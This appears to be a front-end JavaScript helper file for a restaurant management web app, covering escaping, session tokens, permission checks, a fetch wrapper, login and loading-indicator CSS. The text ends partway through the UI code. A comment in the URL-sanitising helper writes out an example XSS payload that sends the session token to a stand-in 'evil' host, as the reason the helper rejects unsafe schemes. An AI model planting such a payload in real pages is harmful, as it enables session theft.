const API_URL = "https://restaurante-backend-production-459b.up.railway.app";

// ── ESCAPE / XSS ──────────────────────────────────────────────
// Helpers canónicos para insertar datos cargados por usuarios en HTML sin ejecutar
// scripts. `esc` para texto dentro de HTML; `escAttr` para valores dentro de atributos
// o strings de JS (onclick="fn('...')"). Globales: los usan todas las páginas.
function esc(s) {
    if (s === null || s === undefined) return "";
    return String(s)
        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
function escAttr(s) {
    // Igual que esc + neutraliza backtick y barra para contextos de atributo/JS-string.
    return esc(s).replace(/`/g, "&#96;").replace(/\//g, "&#47;");
}
window.esc = esc;
window.escAttr = escAttr;

// ── URL SEGURA (XSS por href) ─────────────────────────────────
// esc()/escAttr() escapan metacaracteres HTML pero NO el ESQUEMA de una URL: un
// href="javascript:fetch('//evil/'+localStorage.token)" pasa intacto y roba la sesión
// al hacer clic. Todo href que venga de datos cargados por usuarios pasa por acá.
// Devuelve una URL http(s) segura, o "" si el esquema no es seguro (el llamador
// muestra el texto sin link).
function urlSegura(u) {
    const s = String(u == null ? "" : u).trim();
    if (!s) return "";
    if (/^https?:\/\//i.test(s)) return s;
    // Tiene un esquema y no es http(s) → javascript:, data:, vbscript:, file:… → fuera.
    if (/^[a-z][a-z0-9+.-]*:/i.test(s)) return "";
    // Sin esquema (ej. "www.pagina.com"): asumimos https.
    return "https://" + s;
}
window.urlSegura = urlSegura;

// ── DISPLAY NAME ──────────────────────────────────────────────
// El programa nombra a las personas por "Nombre Apellido" (campo `nombre_display`
// que devuelve el backend); el username queda como credencial corta de login.
// Fallback en cadena para respuestas viejas o usuarios sin nombre cargado.
function displayName(x) {
    if (!x) return "";
    return x.nombre_display
        || [x.nombre, x.apellido].filter(Boolean).join(" ")
        || x.username || "";
}
window.displayName = displayName;

// ── USERNAME único global: normalización + autocompletado + chequeo en vivo ──
// Mirror del backend (fichas.normalizar_username): sin tildes, sin espacios, alfanum + punto.
function normalizarUsername(s) {
    return (s || "").normalize("NFKD").replace(/[̀-ͯ]/g, "").replace(/[^A-Za-z0-9.]/g, "");
}
window.normalizarUsername = normalizarUsername;

// Cablea nombre/apellido → propuesta de username libre + chequeo de disponibilidad
// en vivo. Deshabilita los `botones` (Crear/Guardar) mientras el username no esté libre.
// opts: {nombre, apellido, username, estado, botones:[], base, excluirEmp, editadoManual}
// `base`: "/auth/usuarios" o "/cadena/empleados". Devuelve { estaLibre() }.
function wireUsername(opts) {
    const { nombre, apellido, username, estado, base } = opts;
    const botones = opts.botones || [];
    let editado = !!opts.editadoManual, libre = false, timer = null, seq = 0;
    const setBtns = v => botones.forEach(b => { if (b) b.disabled = !v; });
    const setEstado = (txt, tipo) => {
        if (!estado) return;
        estado.textContent = txt;
        estado.style.fontSize = "11px";
        estado.style.marginTop = "3px";
        estado.style.color = tipo === "ok" ? "#059669" : tipo === "err" ? "#dc2626" : "#6b7280";
    };
    async function proponer() {
        if (editado) return;
        const n = nombre.value.trim(), a = apellido.value.trim();
        if (!n && !a) { username.value = ""; libre = false; setEstado("", ""); return; }
        try {
            const r = await api.getSilent(`${base}/username/sugerir?nombre=${encodeURIComponent(n)}&apellido=${encodeURIComponent(a)}`);
            if (!editado && r && r.propuesta) { username.value = r.propuesta; libre = true; setEstado("Propuesta libre ✓", "ok"); setBtns(true); }
        } catch { }
    }
    async function chequear() {
        const u = normalizarUsername(username.value);
        if (!u) { libre = true; setEstado("Sin usuario: la persona entra por su correo.", ""); setBtns(true); return; }
        const mine = ++seq;
        try {
            const qs = `u=${encodeURIComponent(u)}` + (opts.excluirEmp ? `&excluir_emp=${opts.excluirEmp}` : "");
            const r = await api.getSilent(`${base}/username/disponible?${qs}`);
            if (mine !== seq) return;   // llegó una respuesta vieja
            libre = !!r.libre;
            if (libre) { setEstado("Disponible ✓", "ok"); setBtns(true); }
            else { setEstado(`Ya está en uso — libre: ${r.sugerencia || "—"}`, "err"); setBtns(false); }
        } catch { }
    }
    nombre.addEventListener("input", proponer);
    apellido.addEventListener("input", proponer);
    username.addEventListener("input", () => {
        editado = true; libre = false; setBtns(false);
        setEstado("Verificando…", "");
        clearTimeout(timer); timer = setTimeout(chequear, 350);
    });
    username.addEventListener("blur", () => { username.value = normalizarUsername(username.value); });
    if (username.value.trim()) { editado = true; chequear(); }
    return { estaLibre: () => libre };
}
window.wireUsername = wireUsername;

// Preview de una foto elegida en un <input type=file> dentro de un contenedor redondo.
function previewFotoLocal(inputEl, prevEl) {
    const f = inputEl.files && inputEl.files[0];
    if (!f) return;
    const rd = new FileReader();
    rd.onload = e => {
        prevEl.style.backgroundImage = `url('${e.target.result}')`;
        prevEl.style.backgroundSize = "cover";
        prevEl.style.backgroundPosition = "center";
        prevEl.textContent = "";
    };
    rd.readAsDataURL(f);
}
window.previewFotoLocal = previewFotoLocal;

// ── TOKEN ─────────────────────────────────────────────────────
function getToken() {
    return localStorage.getItem("token");
}

// Identidad del contexto del token: esquema del restaurante (claim "schema") o, para
// tokens sin esquema (superadmin / gerente_cadena / empleado), el rol.
function _ctxDeToken(token) {
    try {
        const p = JSON.parse(atob(String(token).split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
        return p.schema || p.rol || "anon";
    } catch { return "anon"; }
}

// Caches de datos POR RESTAURANTE guardadas con clave global: al cambiar de restaurante
// en el mismo navegador (login / entrar como admin / entrar desde cadena) hay que
// purgarlas o se muestra la moneda/marca/config del restaurante anterior.
const _CACHES_POR_RESTAURANTE = ["sistema_moneda", "moneda_simbolo", "navbar_marca", "edit_mode"];

function setToken(token) {
    const ctx = _ctxDeToken(token);
    if (localStorage.getItem("ctx_rest") !== ctx) {
        _CACHES_POR_RESTAURANTE.forEach(k => localStorage.removeItem(k));
        localStorage.setItem("ctx_rest", ctx);
    }
    localStorage.setItem("token", token);
}

// Clave de localStorage con ámbito por restaurante (para preferencias locales que son
// propias de cada restaurante: metas, umbrales, plantillas de horarios, etc.).
function claveRest(base) {
    return base + "::" + (localStorage.getItem("ctx_rest") || "anon");
}
window.claveRest = claveRest;

// Sesiones existentes (de antes de este cambio): fijar el contexto sin purgar.
if (!localStorage.getItem("ctx_rest") && localStorage.getItem("token")) {
    localStorage.setItem("ctx_rest", _ctxDeToken(localStorage.getItem("token")));
}

function getUser() {
    const u = localStorage.getItem("user");
    return u ? JSON.parse(u) : null;
}

function setUser(user) {
    localStorage.setItem("user", JSON.stringify(user));
}

function logout() {
    // En la web, cerrar sesión va directo al login. (La "vista previa al cerrar
    // sesión" es una función exclusiva del ejecutable, no de la web.)
    _doLogout();
}

function _doLogout() {
    localStorage.removeItem("token");
    localStorage.removeItem("user");
    localStorage.removeItem("edit_mode");
    localStorage.removeItem("emp_token");
    localStorage.removeItem("emp_user");
    localStorage.removeItem("ger_token");
    localStorage.removeItem("ger_user");
    window.location.href = "index.html";
}

// ── Contexto de empleado de cadena ────────────────────────────
// Sesión base = token de empleado (emp_token/emp_user). El "token activo" (token/user)
// puede ser el de empleado (cuenta) o el de un restaurante donde entró.
function getEmpToken() { return localStorage.getItem("emp_token"); }
function getEmpUser() { const u = localStorage.getItem("emp_user"); return u ? JSON.parse(u) : null; }
function esEmpleadoCadena() { return !!getEmpToken(); }
function enCuenta() {  // true si el token activo es el de la cuenta (no un restaurante)
    return !esEmpleadoCadena() || getToken() === getEmpToken();
}
function volverACuenta() {
    const t = getEmpToken(), u = getEmpUser();
    if (t) setToken(t);
    if (u) setUser(u);
}
async function entrarRestaurante(restId) {
    // Usa SIEMPRE el token de empleado para emitir el del restaurante.
    const resp = await apiFetch("/empleado/entrar/" + restId, {
        method: "POST", body: JSON.stringify({}), token: getEmpToken()
    });
    setToken(resp.access_token);
    const { access_token, token_type, ...uf } = resp;
    setUser(uf);
    return resp;
}

// ── Contexto de gerente de cadena ─────────────────────────────
// Sesión base = token de cadena (ger_token/ger_user). Igual que el empleado: el token
// activo puede ser el de cadena o el de un restaurante donde "entró". Permite cambiar
// entre locales sin re-loguearse (p. ej. el filtro multi-restaurante de cuadrante).
function getGerToken() { return localStorage.getItem("ger_token"); }
function getGerUser() { const u = localStorage.getItem("ger_user"); return u ? JSON.parse(u) : null; }
function esGerenteCadena() { return !!getGerToken(); }
function enCuentaGer() { return !esGerenteCadena() || getToken() === getGerToken(); }
function volverACuentaGer() {
    const t = getGerToken(), u = getGerUser();
    if (t) setToken(t);
    if (u) setUser(u);
}
async function entrarRestauranteGer(restId) {
    // Usa SIEMPRE el token de cadena para emitir el del restaurante.
    const resp = await apiFetch("/cadena/entrar/" + restId, {
        method: "POST", body: JSON.stringify({}), token: getGerToken()
    });
    setToken(resp.access_token);
    const { access_token, token_type, ...uf } = resp;
    setUser(uf);
    return resp;
}

// ── EVENTOS EN TIEMPO REAL (SSE) ──────────────────────────────
// Abre /eventos/stream y llama onTipo(tipo) cuando el server publica una señal
// ("pos" / "reservas"). EventSource reconecta solo si se cae. `tipos` filtra
// (string, array, o null = todos). Devuelve { cerrar() } para limpiar al salir.
function suscribirEventos(tipos, onTipo) {
    if (!window.EventSource || !getToken()) return { cerrar() {} };
    const filtro = Array.isArray(tipos) ? tipos : (tipos ? [tipos] : null);
    let es = null, cerrado = false;

    function conectar() {
        if (cerrado) return;
        const tok = getToken();
        if (!tok) return;
        es = new EventSource(`${API_URL}/eventos/stream?token=${encodeURIComponent(tok)}`);
        es.onmessage = (ev) => {
            let tipo;
            try { tipo = JSON.parse(ev.data).tipo; } catch { return; }
            if (!filtro || filtro.includes(tipo)) {
                try { onTipo(tipo); } catch (e) { console.error(e); }
            }
        };
        // EventSource reintenta solo ante error/caída; no hace falta lógica extra.
        es.onerror = () => {};
    }
    conectar();

    const cerrar = () => { cerrado = true; if (es) { es.close(); es = null; } };
    window.addEventListener('pagehide', cerrar);
    window.addEventListener('beforeunload', cerrar);
    return { cerrar };
}

function requireAuth() {
    if (!getToken()) {
        window.location.href = "index.html";
    }
}

function requireRol(...roles) {
    const user = getUser();
    if (!user || !roles.includes(user.rol)) {
        alert("No tenés permiso para acceder a esta sección.");
        window.location.href = "dashboard.html";
    }
}

/**
 * Exige que el usuario tenga al menos uno de los permisos indicados.
 * Admin y gerente siempre pasan. Si no cumple, redirige al dashboard.
 */
function requirePermiso(...perms) {
    const user = getUser();
    if (!user) { window.location.href = "index.html"; return; }
    if (user.rol === "admin" || user.rol === "gerente") return;
    if (perms.some(p => user[p])) return;
    alert("No tenés permiso para acceder a esta sección.");
    window.location.href = "dashboard.html";
}

/**
 * Devuelve true si el usuario tiene el permiso dado.
 * Admin y gerente siempre devuelven true.
 */
function hasPermiso(perm) {
    const user = getUser();
    if (!user) return false;
    if (user.rol === "admin" || user.rol === "gerente") return true;
    return !!user[perm];
}

/**
 * Devuelve true si el usuario tiene al menos uno de los permisos dados.
 */
function hasAlgunPermiso(...perms) {
    return perms.some(p => hasPermiso(p));
}

// ── FETCH BASE ────────────────────────────────────────────────
// Timeout por request (ms). Generoso para tolerar el cold-start de Railway.
const _API_TIMEOUT_MS = 20000;
// Métodos idempotentes: se pueden reintentar ante un fallo de red / 502-503-504 sin
// riesgo de duplicar la operación. POST/PATCH NO se reintentan (un POST que el server
// igual procesó duplicaría, p.ej. un cobro).
const _RETRY_METHODS = new Set(["GET", "HEAD", "PUT", "DELETE"]);

function _sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function apiFetch(endpoint, options = {}) {
    const token  = options.token || getToken();
    const method = (options.method || "GET").toUpperCase();
    // Con FormData (multipart) NO seteamos Content-Type: el browser pone el boundary solo.
    const headers = {
        ...(options.body instanceof FormData ? {} : { "Content-Type": "application/json" }),
        ...(token ? { "Authorization": `Bearer ${token}` } : {}),
        ...(options.headers || {})
    };

    const reintentable = _RETRY_METHODS.has(method);
    const maxIntentos  = reintentable ? 3 : 1;

    // options.silent → no muestra la barra de carga global (para polling de fondo).
    if (window.UI && !options.silent) window.UI._reqStart();
    try {
        let ultimoError = null;
        for (let intento = 0; intento < maxIntentos; intento++) {
            // AbortController: corta un request que se cuelga (no deja la barra eterna).
            const ctrl  = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), _API_TIMEOUT_MS);
            let res;
            try {
                res = await fetch(`${API_URL}${endpoint}`, { ...options, headers, signal: ctrl.signal });
            } catch (e) {
                clearTimeout(timer);
                // Error de red / abort → reintentar si es idempotente.
                ultimoError = (e.name === "AbortError")
                    ? new Error("La solicitud tardó demasiado. Reintentá.")
                    : new Error("Sin conexión con el servidor.");
                if (reintentable && intento < maxIntentos - 1) {
                    await _sleep(400 * Math.pow(2, intento));   // backoff 0.4s, 0.8s
                    continue;
                }
                throw ultimoError;
            }
            clearTimeout(timer);

            if (res.status === 401) { logout(); return; }

            // Cold start de Railway (502/503/504) y 500 intermitentes del pooler
            // (search_path perdido): reintentar los idempotentes con backoff.
            if (reintentable && [500, 502, 503, 504].includes(res.status) && intento < maxIntentos - 1) {
                await _sleep(700 * Math.pow(2, intento));   // 0.7s, 1.4s
                continue;
            }

            if (!res.ok) {
                const err = await res.json().catch(() => ({ detail: "Error desconocido" }));
                // detail puede ser un array/objeto (422 de FastAPI) → legible, no "[object Object]"
                let msg = err.detail;
                if (Array.isArray(msg)) msg = msg.map(x => (x && x.msg) || JSON.stringify(x)).join(" · ");
                else if (msg && typeof msg === "object") msg = JSON.stringify(msg);
                throw new Error(msg || "Error en la API");
            }

            if (res.status === 204) return null;
            return res.json();
        }
        throw ultimoError || new Error("Error en la API");
    } finally {
        if (window.UI && !options.silent) window.UI._reqEnd();
    }
}

// ── MÉTODOS SHORTHAND ─────────────────────────────────────────
const api = {
    get: (endpoint) => apiFetch(endpoint),
    // Igual que get pero sin la barra de carga global (para refrescos en segundo plano).
    getSilent: (endpoint) => apiFetch(endpoint, { silent: true }),
    post: (endpoint, body) => apiFetch(endpoint, { method: "POST", body: JSON.stringify(body) }),
    put: (endpoint, body) => apiFetch(endpoint, { method: "PUT", body: JSON.stringify(body) }),
    patch: (endpoint, body) => apiFetch(endpoint, { method: "PATCH", body: JSON.stringify(body) }),
    delete: (endpoint) => apiFetch(endpoint, { method: "DELETE" }),
};

// ── LOGIN ─────────────────────────────────────────────────────
async function login(username, password, codigo) {
    const formData = new URLSearchParams();
    formData.append("username", username);
    formData.append("password", password);
    if (codigo) formData.append("codigo", codigo);

    const res = await fetch(`${API_URL}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData
    });

    if (!res.ok) {
        const err = await res.json().catch(() => ({ detail: "Error de login" }));
        throw new Error(err.detail || "Error de login");
    }

    const data = await res.json();
    setToken(data.access_token);
    // Guardar todos los campos del token (username, rol + todos los permisos)
    const { access_token, token_type, ...userFields } = data;
    setUser(userFields);
    // Empleado de cadena: guardar la sesión base de "cuenta" (token activo = cuenta).
    if (data.rol === "empleado_cadena") {
        localStorage.setItem("emp_token", data.access_token);
        localStorage.setItem("emp_user", JSON.stringify(userFields));
    } else {
        localStorage.removeItem("emp_token");
        localStorage.removeItem("emp_user");
    }
    // Gerente de cadena: guardar la sesión base de "cuenta" (igual que el empleado).
    if (data.rol === "gerente_cadena") {
        localStorage.setItem("ger_token", data.access_token);
        localStorage.setItem("ger_user", JSON.stringify(userFields));
    } else {
        localStorage.removeItem("ger_token");
        localStorage.removeItem("ger_user");
    }
    return data;
}

// ── Abrir documentos (facturas / revisiones) en pestaña nueva ──
// Los archivos en Cloudinary se sirven como "attachment" (se descargan).
// Para verlos renderizados: traemos el archivo, lo reconstruimos como Blob con
// el content-type correcto y lo abrimos en una pestaña nueva. A los HTML se les
// inyecta un botón "Descargar PDF" (imprime → guardar como PDF).
function _msgPestania(w, html) {
    if (w) { try { w.document.write(html); w.document.close(); } catch (_) {} }
}
async function abrirDocumento(url) {
    if (!url) return;
    // Abrir la pestaña YA (dentro del gesto de click) para que no la bloqueen
    const w = window.open("", "_blank");
    _msgPestania(w, "<p style='font-family:Segoe UI,sans-serif;padding:24px;color:#64748b;'>Cargando documento…</p>");
    const limpio = url.toLowerCase().split("?")[0];
    const esPdf = limpio.endsWith(".pdf");
    const esImg = /\.(png|jpe?g|webp|gif)$/.test(limpio);
    try {
        const resp = await fetch(url);
        if (!resp.ok) {
            const msg = resp.status === 401
                ? "No se pudo abrir el documento: Cloudinary bloquea la entrega de PDF/ZIP. Habilitá «Allow delivery of PDF and ZIP files» en Cloudinary → Settings → Security."
                : ("No se pudo abrir el documento (HTTP " + resp.status + ").");
            _msgPestania(w, "<p style='font-family:Segoe UI,sans-serif;padding:24px;color:#b91c1c;'>" + msg + "</p>");
            if (!w) alert(msg);
            return;
        }

        let blob;
        if (!esPdf && !esImg) {
            // HTML (facturas/revisiones) → inyectar botón "Descargar PDF"
            let html = await resp.text();
            const barra =
                "<div id='__dlbar' style=\"position:fixed;top:12px;right:12px;z-index:99999;font-family:Segoe UI,sans-serif;\">" +
                "<button onclick='window.print()' style=\"background:#4f46e5;color:#fff;border:none;border-radius:8px;" +
                "padding:10px 16px;font-size:14px;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.25);\">" +
                "⬇ Descargar PDF</button></div>" +
                "<style>@media print{#__dlbar{display:none!important}}</style>";
            html = html.includes("</body>") ? html.replace("</body>", barra + "</body>") : (html + barra);
            blob = new Blob([html], { type: "text/html" });
        } else {
            blob = await resp.blob();
            let type = blob.type;
            if (!type || type === "application/octet-stream" || type === "text/plain") {
                type = esPdf ? "application/pdf"
                     : limpio.endsWith(".png") ? "image/png"
                     : /\.jpe?g$/.test(limpio) ? "image/jpeg"
                     : limpio.endsWith(".webp") ? "image/webp"
                     : limpio.endsWith(".gif") ? "image/gif" : "application/octet-stream";
                blob = blob.slice(0, blob.size, type);
            }
        }

        const blobUrl = URL.createObjectURL(blob);
        if (w) w.location.href = blobUrl;
        else   window.open(blobUrl, "_blank");
        setTimeout(() => URL.revokeObjectURL(blobUrl), 120000);
    } catch (e) {
        const msg = "No se pudo abrir el documento: " + (e.message || e);
        _msgPestania(w, "<p style='font-family:Segoe UI,sans-serif;padding:24px;color:#b91c1c;'>" + msg + "</p>");
        if (!w) alert(msg);
    }
}

// ── UI: indicadores de carga compartidos ──────────────────────
// Inyecta CSS una sola vez y expone window.UI con: barra de progreso global (que
// apiFetch dispara automáticamente en cada request), skeletons, overlay bloqueante y
// estado "busy" de botones. Disponible en TODA página que incluya js/api.js.
(function () {
    if (window.UI) return;

    const css = `
    @keyframes ui-spin { to { transform: rotate(360deg); } }
    @keyframes ui-shimmer { 0% { background-position: -400px 0; } 100% { background-position: 400px 0; } }

    /* ── Marca Chief Point ──────────────────────────────────────────────────
       El punto verde ES la marca, y animarlo es INFORMACIÓN, no adorno: cada
       variante significa una espera distinta. Si todas giraran igual no
       comunicarían nada.
         .cp-orbit  petición en vuelo (cargar, guardar, cobrar)
         .cp-pulse  esperando sin saber cuánto (arranque, NFC, GPS, reconexión)
         .cp-scan   la IA trabajando (leer factura, importar) — más lenta a propósito
         .cp-beat   vivo y conectado; NO es una espera (con .cp-off = caído)
         .cp-prog   progreso REAL con porcentaje (subida, descarga, instalación)
       Este mismo bloque está en restaurante-pos y restaurante-empleados
       (www/js/core/ui.js): si se toca acá, tocarlo en los tres.                */
    :root {
        --cp-navy: #1B1B33; --cp-lime: #C9FF1F;
        --cp-r1: #B4E025; --cp-r2: #93BE1E; --cp-r3: #6E8A18; --cp-r4: #4C5A15;
    }
    /* El punto quieto (logotipo). Los anillos se simplifican POR TAMAÑO: tres pasos
       desde 32px, dos entre 24 y 32 (.cp-sm), lima plano por debajo (.cp-xs) — más
       abajo el degradado es una mancha verde y pierde más de lo que aporta. */
    .cp-dot { position: relative; display: inline-block; flex: none;
              width: 1em; height: 1em; border-radius: 50%; background: var(--cp-r4); }
    .cp-dot::before, .cp-dot::after { content: ""; position: absolute; border-radius: 50%; }
    .cp-dot::before { inset: 11%; background: var(--cp-r2); }
    .cp-dot::after  { inset: 26%; background: var(--cp-lime); }
    .cp-dot.cp-sm { background: var(--cp-r2); }
    .cp-dot.cp-sm::before { inset: 20%; background: var(--cp-lime); }
    .cp-dot.cp-sm::after  { display: none; }
    .cp-dot.cp-xs { background: var(--cp-lime); }
    .cp-dot.cp-xs::before, .cp-dot.cp-xs::after { display: none; }

    /* Logotipo. La "o" de "point" NO es una letra: es el punto — de ahí el nombre.
       .cp-papel = versión para FONDO CLARO (facturas, recibos, documentos): el texto
       pasa a navy y NO a negro, que vuelve la marca genérica. */
    .cp-marca { display: inline-flex; align-items: center; color: #fff;
                font-family: Poppins,'Segoe UI',system-ui,sans-serif;
                font-weight: 500; letter-spacing: -.012em; line-height: 1; }
    .cp-marca .cp-dot { width: .78em; height: .78em; }
    .cp-marca.cp-papel { color: var(--cp-navy); }

    /* ⚠ Sobre fondo claro el núcleo NO se oscurece. La rampa va siempre de oscuro
       afuera a brillante adentro, y el lima nunca toca el fondo: lo rodean los
       anillos. Oscurecerlo invierte la rampa y el punto se lee como un agujero en
       vez de como una luz encendida (probado: se ve mal).
       El único que sí apoya directo sobre el fondo es el plano de .cp-xs. */
    .cp-papel.cp-dot.cp-xs, .cp-papel .cp-dot.cp-xs { background: var(--cp-r3); }

    @keyframes cp-spin  { to { transform: rotate(360deg); } }
    @keyframes cp-pulse { 0% { transform: scale(.34); opacity: .9; } 100% { transform: scale(1.5); opacity: 0; } }
    @keyframes cp-scan  { 0%, 100% { background: var(--cp-r4); } 40% { background: var(--cp-lime); } }
    @keyframes cp-beat  {
        0%, 42%, 100% { transform: scale(1);    box-shadow: 0 0 0 0  rgba(201,255,31,.55); }
        12%           { transform: scale(1.16); box-shadow: 0 0 0 7px rgba(201,255,31,0); }
        26%           { transform: scale(1.10); box-shadow: 0 0 0 10px rgba(201,255,31,0); }
    }
    .cp-orbit, .cp-pulse, .cp-scan, .cp-prog {
        position: relative; display: inline-block; flex: none; width: 38px; height: 38px;
    }
    .cp-orbit::before { content: ""; position: absolute; inset: 32%; border-radius: 50%; background: var(--cp-lime); }
    .cp-orbit::after  { content: ""; position: absolute; inset: 0; border-radius: 50%;
                        border: 2.5px solid rgba(147,190,30,.22); border-top-color: var(--cp-r1);
                        animation: cp-spin .95s linear infinite; }
    .cp-pulse::before { content: ""; position: absolute; inset: 30%; border-radius: 50%;
                        background: var(--cp-lime); z-index: 1; }
    .cp-pulse span    { position: absolute; inset: 0; border-radius: 50%; opacity: 0;
                        border: 2px solid var(--cp-r2); animation: cp-pulse 2.2s ease-out infinite; }
    .cp-pulse span:nth-child(2) { animation-delay: .73s; }
    .cp-pulse span:nth-child(3) { animation-delay: 1.46s; }
    .cp-scan span { position: absolute; border-radius: 50%; background: var(--cp-r4);
                    animation: cp-scan 1.6s ease-in-out infinite; }
    .cp-scan span:nth-child(1) { inset: 0;   animation-delay: .30s; }
    .cp-scan span:nth-child(2) { inset: 22%; animation-delay: .15s; }
    .cp-scan span:nth-child(3) { inset: 42%; animation-delay: 0s; }
    .cp-beat { display: inline-block; flex: none; width: 12px; height: 12px; border-radius: 50%;
               background: var(--cp-lime); animation: cp-beat 1.9s ease-in-out infinite; }
    /* Sin conexión: quieto y gris. La AUSENCIA de latido es el dato. */
    .cp-beat.cp-off { background: #9CA194; animation: none; box-shadow: none; }
    /* Determinado: se llena de verdad. Sólo cuando hay porcentaje real — nunca fingido.
       --cp-prog-bg tiene que ser el color de la superficie de atrás (es el agujero). */
    .cp-prog { border-radius: 50%;
               background: conic-gradient(var(--cp-lime) calc(var(--cp-pct, 0) * 1%), rgba(147,190,30,.22) 0);
               transition: background .25s linear; }
    .cp-prog::before { content: ""; position: absolute; inset: 20%; border-radius: 50%;
                       background: var(--cp-prog-bg, #fff); }
    .cp-prog::after  { content: ""; position: absolute; inset: 36%; border-radius: 50%; background: var(--cp-lime); }

    /* ── Estado de la caja ──────────────────────────────────────────────────
       Reusa el LATIDO, que en el resto del kit significa "vivo y funcionando":
       una caja abierta es exactamente eso, un ESTADO y no una espera. Cerrada
       queda roja y quieta — la AUSENCIA de latido es la mitad del mensaje.
       ⚠ El anillo oscuro fijo (primer box-shadow) no es decoracion: el lima sobre
       un fondo pastel claro casi no contrasta, y sin el anillo el punto desaparece
       justo en el sitio donde tiene que verse de un vistazo.                     */
    @keyframes cp-caja-late {
        0%, 42%, 100% { transform: scale(1);    box-shadow: 0 0 0 2px var(--cp-r4), 0 0 0 0  rgba(201,255,31,.55); }
        12%           { transform: scale(1.14); box-shadow: 0 0 0 2px var(--cp-r4), 0 0 0 6px rgba(201,255,31,0); }
        26%           { transform: scale(1.08); box-shadow: 0 0 0 2px var(--cp-r4), 0 0 0 9px rgba(201,255,31,0); }
    }
    .cp-caja {
        display: inline-block; flex: none; width: 11px; height: 11px;
        border-radius: 50%; background: var(--cp-lime);
        vertical-align: -1px; margin-right: 7px;
        box-shadow: 0 0 0 2px var(--cp-r4);
        animation: cp-caja-late 1.9s ease-in-out infinite;
    }
    .cp-caja.cp-cerrada {
        background: #dc2626; box-shadow: 0 0 0 2px #7f1d1d; animation: none;
    }

    /* Dentro de un botón o una línea de texto. Los trazos se afinan con el tamaño:
       a 20px un borde de 2.5px se come el dibujo entero. */
    .cp-orbit.cp-mini, .cp-pulse.cp-mini, .cp-scan.cp-mini, .cp-prog.cp-mini {
        width: 20px; height: 20px; vertical-align: -5px; margin-right: 6px;
    }
    .cp-mini.cp-orbit::after { border-width: 2px; }
    .cp-mini.cp-pulse span   { border-width: 1.5px; }

    @media (prefers-reduced-motion: reduce) {
        /* En una herramienta que se usa ocho horas seguidas esto no es opcional. */
        .cp-orbit::after, .cp-pulse span, .cp-scan span, .cp-beat, .cp-caja { animation: none !important; }
        .cp-pulse span { opacity: .35; transform: scale(1); }
    }

    /* Indicador flotante de carga. Aparece SOLO si una peticion tarda de verdad
       (ver UMBRAL_PILL abajo): la barra de arriba avisa que algo pasa, pero es tan
       fina y tan rapida que en una espera larga no se sabe si el programa trabaja o
       se colgo. No bloquea (pointer-events: none): el usuario puede seguir.  */
    #ui-cargando {
        position: fixed; top: 14px; left: 50%; transform: translateX(-50%) translateY(-14px);
        z-index: 99997; display: flex; align-items: center; gap: 9px;
        background: var(--cp-navy); color: #E9EBE1;
        font-family: 'Segoe UI', sans-serif; font-size: 13.5px;
        padding: 9px 16px 9px 12px; border-radius: 999px;
        box-shadow: 0 8px 26px rgba(0,0,0,.28);
        pointer-events: none; opacity: 0;
        transition: opacity .2s ease, transform .2s ease;
    }
    #ui-cargando.ui-ver { opacity: 1; transform: translateX(-50%) translateY(0); }

    #ui-progress {
        position: fixed; top: 0; left: 0; height: 3px; width: 0;
        background: linear-gradient(90deg, var(--cp-r3), var(--cp-lime));
        box-shadow: 0 0 8px rgba(201,255,31,.55);
        z-index: 99999; opacity: 0; pointer-events: none;
        transition: width .2s ease, opacity .3s ease;
    }
    .ui-spinner {
        display: inline-block; width: 18px; height: 18px; vertical-align: middle;
        border: 2.5px solid rgba(255,255,255,.35); border-top-color: currentColor;
        border-radius: 50%; animation: ui-spin .7s linear infinite;
    }
    .ui-overlay {
        position: fixed; inset: 0; z-index: 99998;
        background: rgba(17,24,39,.45);
        display: flex; align-items: center; justify-content: center;
    }
    /* Navy y no blanco: es el único fondo sobre el que el lima de la marca contrasta,
       y es el momento en que el producto se muestra a sí mismo. */
    .ui-overlay-box {
        background: var(--cp-navy); border-radius: 14px; padding: 26px 34px;
        box-shadow: 0 16px 48px rgba(0,0,0,.38);
        display: flex; flex-direction: column; align-items: center; gap: 14px;
        font-family: 'Segoe UI', sans-serif; color: #E9EBE1; font-size: 14px;
        min-width: 200px; text-align: center;
    }
    .ui-overlay-box .cp-prog { --cp-prog-bg: var(--cp-navy); }
    .ui-skel {
        display: inline-block; height: 12px; border-radius: 6px; background: #e5e7eb;
        background-image: linear-gradient(90deg,#e5e7eb 0px,#f3f4f6 200px,#e5e7eb 400px);
        background-size: 800px 100%; animation: ui-shimmer 1.2s infinite linear;
    }
    .ui-skel-card {
        border-radius: 12px; min-height: 90px; background: #f3f4f6;
        background-image: linear-gradient(90deg,#f3f4f6 0px,#e9eaee 200px,#f3f4f6 400px);
        background-size: 800px 100%; animation: ui-shimmer 1.2s infinite linear;
    }
    button[data-ui-busy] { pointer-events: none; opacity: .7; }
    .ui-toast-wrap {
        position: fixed; top: 14px; right: 14px; z-index: 100000;
        display: flex; flex-direction: column; gap: 8px; pointer-events: none;
    }
    .ui-toast {
        font-family: 'Segoe UI', sans-serif; font-size: 14px; color: #fff;
        background: #374151; padding: 12px 16px; border-radius: 10px;
        box-shadow: 0 8px 24px rgba(0,0,0,.22); max-width: 360px;
        white-space: pre-line; line-height: 1.35;
        opacity: 0; transform: translateX(20px); transition: opacity .25s ease, transform .25s ease;
    }
    .ui-toast.show { opacity: 1; transform: translateX(0); }
    .ui-toast-success { background: #16a34a; }
    .ui-toast-error   { background: #dc2626; }
    .ui-toast-info    { background: #4f46e5; }
    `;
    const st = document.createElement("style");
    st.textContent = css;
    (document.head || document.documentElement).appendChild(st);

    // Marcado de cada animación de marca. El punto quieto (.cp-dot) y el logotipo
    // (.cp-marca) no van acá: son estáticos y se escriben directo en el HTML.
    // extra: clases sueltas, p.ej. "cp-mini" para meterlo dentro de un botón.
    function _animHTML(tipo, extra) {
        const c = extra ? " " + extra : "";
        if (tipo === "pulse") return `<span class="cp-pulse${c}"><span></span><span></span><span></span></span>`;
        if (tipo === "scan")  return `<span class="cp-scan${c}"><span></span><span></span><span></span></span>`;
        if (tipo === "prog")  return `<span class="cp-prog${c}"></span>`;
        if (tipo === "beat")  return `<span class="cp-beat${c}"></span>`;
        return `<span class="cp-orbit${c}"></span>`;
    }

